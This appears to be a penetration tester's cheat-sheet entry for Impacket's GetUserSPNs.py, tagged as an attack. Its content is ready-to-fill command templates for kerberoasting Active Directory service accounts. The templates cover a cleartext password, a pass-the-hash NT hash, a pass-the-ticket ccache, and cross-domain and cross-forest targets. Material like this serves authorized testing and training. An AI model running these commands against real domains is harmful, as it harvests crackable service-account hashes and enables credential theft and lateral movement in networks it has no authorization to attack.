# GetUserSPNs.py  (imp)

% impacket-kerberos, windows, kerberos, 88, kerberoasting

#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 

## desc
```
 find and fetch Service Principal Names that are associated with normal user accounts
```

## kerberoasting (creds)
```bash
GetUserSPNs.py -debug -request -dc-ip <dc_fqdn> <domain_fqdn>/<user>:'<password>'
```

## kerberoasting (pth)
```bash
GetUserSPNs.py -debug -request -dc-ip <dc_fqdn> -hashes :<nt_hash> <domain_fqdn>/<user>
```

## kerberoasting (ptt)
```bash
KRB5CCNAME=<ccache> GetUserSPNs.py -debug -request -dc-ip <dc_fqdn> -no-pass -k <domain_fqdn>/<user>
```

## kerberoasting (inter domain creds)
```bash
GetUserSPNs.py -debug -request -target-domain <dst_domain_fqdn> <domain_fqdn>/<user>:'<password>'
```


## kerberoasting (inter domain pth)
```bash
GetUserSPNs.py -debug -request -target-domain <dst_domain_fqdn> -hashes :<nt_hash> <domain_fqdn>/<user>
```

## kerberoasting - cross forest (ptt)
to test
need inter-realm ticket
```bash
KRB5CCNAME=<ccache> GetUserSPNs.py -debug -request -target-domain <dst_domain_fqdn> -no-pass -k <domain_fqdn>/<user>
```